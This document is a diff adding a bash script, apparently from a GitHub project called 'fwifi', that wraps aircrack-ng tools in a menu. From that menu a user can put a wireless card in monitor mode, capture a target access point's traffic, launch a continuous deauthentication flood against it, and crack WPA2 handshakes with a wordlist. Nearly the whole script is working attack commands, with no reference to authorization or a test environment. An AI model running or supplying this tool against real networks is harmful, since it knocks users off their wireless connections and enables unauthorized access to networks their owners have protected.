@@ -1,0 +1,131 @@
+#!/bin/bash
+
+if [ "$EUID" -ne 0 ]; then
+  echo "[Error] This script must be run as root."
+  exit 1
+fi
+
+# Default interface
+interface=""
+
+while getopts "i:-:" opt; do
+  case $opt in
+    i)
+      interface="$OPTARG"
+      ;;
+    -)
+      case "${OPTARG}" in
+        interface)
+          interface="${!OPTIND}"
+          OPTIND=$((OPTIND + 1))
+          ;;
+        *)
+          echo "[Error] Invalid option: --${OPTARG}"
+          exit 1
+          ;;
+      esac
+      ;;
+    \?)
+      echo "[Error] Invalid option: -$OPTARG"
+      exit 1
+      ;;
+  esac
+done
+
+if [ -z "$interface" ]; then
+  echo "[Error] Interface is not specified. Please use the -i or --interface option."
+  exit 1
+fi
+
+if ! ip link show "$interface" &>/dev/null; then
+  echo "[Error] Interface '$interface' not found."
+  exit 1
+fi
+
+while true; do
+  clear
+  echo ""
+  echo "    @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
+  echo "      _______      ________      _______      _______      _______  "
+  echo "     |    ___|    |  |  |  |    |_     _|    |    ___|    |_     _| "
+  echo "     |    ___|    |  |  |  |     _|   |_     |    ___|     _|   |_  "
+  echo "     |___|        |________|    |_______|    |___|        |_______| "
+  echo "                                                                    "
+  echo "              Github: https://github.com/rofidoang03/fwifi          "
+  echo "                                                                    "
+  echo "     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ "
+  echo "                                                                    "
+  echo "     [0] Update                                                     "
+  echo "     [1] Enable Monitor Mode                                        "
+  echo "     [2] Disable Monitor Mode                                       "
+  echo "     [3] Capture Wi-Fi Data                                         "
+  echo "     [4] Inject Wi-Fi Packets                                       "
+  echo "     [5] Crack Wi-Fi Key                                            "
+  echo "     [6] Exit                                                       "
+  echo "                                                                    "
+  # Prompt user input
+  read -p "[fwifi] " choice
+
+  case $choice in
+    0)
+      # Update
+      apt-get update -y
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    1)
+      # Enable Monitor Mode
+      airmon-ng check kill
+      airmon-ng start "${interface}"
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    2)
+      # Disable Monitor Mode
+      airmon-ng stop "${interface}"
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    3)
+      # Capture Wi-Fi Data
+      airodump-ng "${interface}"
+      echo ""
+      read -p "[fwifi] Enter the MAC Address of the Access Point: " target_bssid
+      read -p "[fwifi] Enter the channel: " channel
+      read -p "[fwifi] Enter the output file name: " output_file
+      airodump-ng --bssid "${target_bssid}" --channel "${channel}" -w "${output_file}" "${interface}"
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    4)
+      # Inject Wi-Fi Packets
+      read -p "[fwifi] Enter the MAC Address of the Access Point: " ap
+      aireplay-ng -0 0 -a "${ap}" "${interface}"
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    5)
+      # Crack Wi-Fi Key
+      read -p "[fwifi] Enter the handshake file name: " file_handshake
+      read -p "[fwifi] Enter the wordlist file: " file_wordlist
+      aircrack-ng -a2 -w "${file_wordlist}" "$file_handshake"
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    6)
+      # Exit
+      echo "Thank you! Exiting the program."
+      exit 0
+      ;;
+    ls)
+      echo ""
+      ls
+      echo ""
+      read -p "[Info] Press [Enter] to continue..."
+      ;;
+    *)
+      # Invalid choice
+      echo "[Error] Invalid choice. Please choose again."
+      ;;
+  esac
+done
